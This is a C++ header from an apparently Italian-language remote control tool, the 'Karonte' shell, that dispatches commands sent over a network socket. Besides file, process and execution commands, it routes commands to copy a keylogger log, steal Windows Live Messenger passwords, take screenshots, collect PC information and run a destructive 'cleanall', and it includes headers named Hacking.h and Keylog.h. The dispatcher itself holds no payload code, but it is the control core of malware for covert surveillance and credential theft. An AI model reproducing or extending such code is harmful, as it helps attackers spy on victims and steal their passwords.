/* 
 * File:   CheckCmd.h
 * Author: redo86
 *
 * Created on 3 luglio 2010, 20.11
 */

#ifndef CHECKCMD_H
#define	CHECKCMD_H


#endif	/* CHECKCMD_H */
#include "Directory.h"
//#include "File.h"
#include "Help.h"
#include "ContrError.h"
#include "CloseFunction.h"
#include "Process.h"
#include "Device.h"
#include "Message.h"
#include "Hacking.h"
#include "Keylog.h"
#include "PcInfo.h"
#include"Piano.h"


void Check(string);




void Check(string cmd){
    int Fsize;
     if(cmd=="outdos")Outdos(cmd);
     else if(cmd=="ls")StampaDir(cmd);
     else if(cmd=="help")Help();
     else if(cmd=="top")ViewProc(cmd);
     else if(cmd=="logout")CloseUser(cmd);
     else if(cmd=="cleanall")Shutdown("destroy");
     else if(cmd=="device")GetDevice(cmd);
     else if(cmd=="opencd")OpenCD(cmd);
     else if(cmd=="closecd")CloseCD(cmd);
     else if(cmd=="hello")SendHello(cmd);
     else if(cmd=="piano")Piano(cmd);
     else if(cmd=="clear")system("clear");

     else if(cmd=="msn"){
         cout<<endl<<"ATTENZIONE: a seconda della versione Windows Live Messenger, questa funzione puo cause il crash del server!"<<endl<<"Proseguire? [s/n]: ";
         if(mygetch()=='s')
            MsnPassword(cmd);
         else cout<<endl;
     
     }

     else if(cmd=="screen")Screen(cmd);
     else if(cmd=="cplog")Keylogcopy(cmd);
     else if(cmd=="pcinfo")PcInfo(cmd);
     else if(cmd=="upgrade")Upgrade(cmd);
     else if(cmd=="viewdir")ViewDir();
     else if((cmd=="shutdown -r") || (cmd=="shutdown -h") || (cmd=="shutdown -l"))CloseUser(cmd);

     else if(cmd[0]=='c' && cmd[1]=='d' && cmd[2]==' ' && cmd[3]!='\0')Cd(cmd);

     else if(cmd[0]=='c' && cmd[1]=='p' && cmd[2]==' '  && cmd[3]!='\0'){
         if(!contrCp(cmd))return;
         send(cl_sk,cmd.c_str(),cmd.size(),0);CopyFiles(&cmd[3]);
     }

     else if(cmd[0]=='s' && cmd[1]=='d' && cmd[2]==' ' && cmd[3]!='\0'){
          if((Fsize=FileExists(&cmd[3]))!=0){//se il file esiste in locale
              send(cl_sk,cmd.c_str(),cmd.length(),0);
                SendRemoteFile(&cmd[3],Fsize);
          }
     }


     else if(cmd[0]=='e' && cmd[1]=='x' && cmd[2]=='e' && cmd[3]=='c' && cmd[4]==' ' && cmd[5]!='\0'){if(!ContrExec(cmd,0))return;Exec(cmd);}
     else if(cmd[0]=='e' && cmd[1]=='x' && cmd[2]=='e' && cmd[3]=='c' && cmd[4]=='b' && cmd[5]==' ' && cmd[6]!='\0'){if(!ContrExec(cmd,1))return;Exec(cmd);}


     else if(cmd[0]=='m' && cmd[1]=='k' && cmd[2]=='d' && cmd[3]=='i' && cmd[4]=='r' && cmd[5]==' ' && cmd[6]!='\0')MkDir(cmd);
     else if(cmd[0]=='k' && cmd[1]=='i' && cmd[2]=='l' && cmd[3]=='l' && cmd[4]==' ' && cmd[5]!='\0')KillProc(cmd);
     else if(cmd[0]=='r' && cmd[1]=='m' && cmd[2]=='d' && cmd[3]=='i' && cmd[4]=='r' && cmd[5]==' ' && cmd[6]!='\0')RmDir(cmd);     
     else if(cmd[0]=='m' && cmd[1]=='s' && cmd[2]=='g' && cmd[3]==' ' && cmd[4]!='\0')send(cl_sk,cmd.c_str(),cmd.size(),0);
     else if(cmd[0]=='t' && cmd[1]=='o' && cmd[2]=='u' && cmd[3]=='c' && cmd[4]=='h' && cmd[5]==' ' && cmd[6]!='\0')Touch(cmd);
     else if(cmd[0]=='f' && cmd[1]=='i' && cmd[2]=='n' && cmd[3]=='d' && cmd[4]==' ' && ((cmd[5]!='-') || (cmd[5]=='-' && cmd[6]=='a' && cmd[7]==' ')))Find(cmd);//ricordarsi i thread
	// else if(cmd[0]=='m' && cmd[1]=='m' && ((cmd[2]=='\0') || (cmd[2]==' ' && cmd[3]=='-' && (cmd[4]=='i'  || cmd[4]=='a'))))Mv_Mouse(cmd);
     else if(cmd[0]=='r' && cmd[1]=='m' && cmd[2]==' ' && cmd[3]!='\0')DelFile(cmd);
     else if(cmd[0]=='m' && cmd[1]=='a' && cmd[2]=='n' && cmd[3]==' ' && cmd[4]!='\0')Man(cmd);
     else if(Check_Error(cmd)==true);  
     else if(cmd[0]!=0)cout<<cmd<<" non e\' riconosciuto come comando nella shell Karonte"<<endl<<endl;
     return;

}